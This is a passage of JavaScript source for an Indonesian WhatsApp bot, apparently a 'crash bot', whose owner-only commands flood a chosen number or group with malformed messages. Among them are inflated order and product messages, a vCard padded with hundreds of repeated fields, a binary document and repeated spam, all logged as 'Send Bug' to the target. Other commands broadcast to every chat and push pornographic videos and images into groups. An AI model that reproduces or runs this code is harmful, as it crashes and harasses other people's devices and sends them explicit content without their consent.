var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"description": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"currencyCode": "IDR",
"footerText": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 WE ARE NOT MASTOD`,
"url": "www.instagram.com/ryarllh_01/"
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: doc})
sock.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
reply(tekteka)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas1' : {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await sock.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
/*BUG WACAP */
case 'ampas2' : {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await sock.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
sock.sendMessage(Pe, {text: "𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳"}, {quoted: a})
await sleep(10000)
}
break
case 'gasdek': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./command/Image/rikgans.jpg') }, { upload: sock.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./command/Image/pict.jpg'),
"orderTitle": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"sellerJid": "6287741097274@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: doc })
sock.relayMessage(m.chat, order.message, { messageId: order.key.id })
reply(`${m.pushName} Hello Saya Bot RIK BOT${text ? ': ' + text : ''}`)
}
break
//=================================================//
case 'bugstik':{
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku sock`
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugie':{
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku sock`
for (let i = 0; i < jumlah; i++) {
sock.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//=================================================//
case 'bugbcimage': case 'bugbcvideo': case 'bugbcaudio': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
let anu = await store.chats.all().map(v => v.id)
let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./command/Image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: '𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
for (let i of anu) {
await sleep(1500)
let butoon = [{
urlButton: {
displayText: `INSTAGRAM`,
url: 'https://www.instagram.com/ryarllh_01/'
}
},
{
quickReplyButton: {
displayText: 'ALL MENU',
id: 'allmenu'
}
}]
let media = await sock.downloadAndSaveMediaMessage(quoted)
let buffer = fs.readFileSync(media)
if (/webp/.test(mime)) {
sock.sendMessage(i, { sticker: { url: media } }, { quoted: doc })
} else if (/image/.test(mime)) {
let junn = `*_BROADCAST IMAGE_*${text ? '\n\n' + text : ''}`
sock.send5ButImg(i, junn, `${global.botname}`, buffer, butoon)
} else if (/video/.test(mime)) {
let junn = `*_BROADCAST VIDIO_*${text ? '\n\n' + text : ''}`
sock.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
} else if (/audio/.test(mime)) {
sock.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
} else {
m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
}
await fs.unlinkSync(media)
}
m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
}
break
//=================================================//
case 'bugbctext': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (!text) throw `*Type some text*\n\nExample : ${prefix + command} rikbos`

let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${sock.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
sock.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
}
m.reply('*Success Broadcast*')
}
break
//=================================================//
//=================================================//
case 'bugtag': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (!m.isGroup) throw groupon(from)
sock.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: doc })
}
break
case 'hiya':{
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

anuin = fs.readFileSync('./Musik/sound/ngeselin.BIN')
sock.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ${ngazap(prefix)}.BIN`, title: `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 ${ngazap(prefix)}.BIN` }, { quoted: doc })
}
break
//=================================================//
case 'bugtod': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
sock.sendContact(m.chat, global.ownerr, fkontaak)
}
break
case 'bugbokep':{
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
sock.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: doc })
}
break
case 'bugsange': {
if (isBan) throw sticBanLu(from)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await sock.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sock.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
let buttonsntnsfww = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await sock.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*WELCOME\n\n
bugcrot
bugahay `, `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let bugcrotbot = [
 {buttonId: `bugcrot`, buttonText: {displayText: buttonvirus}, type: 1},
 ]
let button3Messagess = {
image: {url:waifudd.data.url},
caption:`𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
buttons: bugcrotbot,
headerType: 1
} 
 await sock.sendMessage(m.chat, button3Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 let bugahaybot = [
 {buttonId: `bugahay`, buttonText: {displayText: buttonvirus}, type: 1},
 ]
let button4Messagess = {
image: {url:waifudd.data.url},
caption:`𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
buttons: bugahaybot,
headerType: 1
} 
 await sock.sendMessage(m.chat, button4Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'jadibug1': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./command/Lib/converter')
let audio = await toAudio(media, 'mp4')
sock.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./command/Lib/converter')
let audio = await toAudio(media, 'mp4')
sock.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${sock.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./command/Lib/converter')
let audio = await toPTT(media, 'mp4')
sock.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await sock.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
sock.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!isCreator) return reply(api.owner)
if (isBan) return reply(api.ban)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await sock.downloadAndSaveMediaMessage(quoted)
sock.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await sock.downloadAndSaveMediaMessage(quoted)
sock.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//
case 'permisi':
if (isBan) throw sticBanLu(from)
if (!isCreator) throw sticOwner(from)

touchmebre = [
{
title: `🌷 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Haii bang`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Haii Anak" ganteng`}
]
}
]
sock.sendListMsg(m.chat, `🌷 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 🌷`, sock.user.name, `Hi Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break
//=================================================//
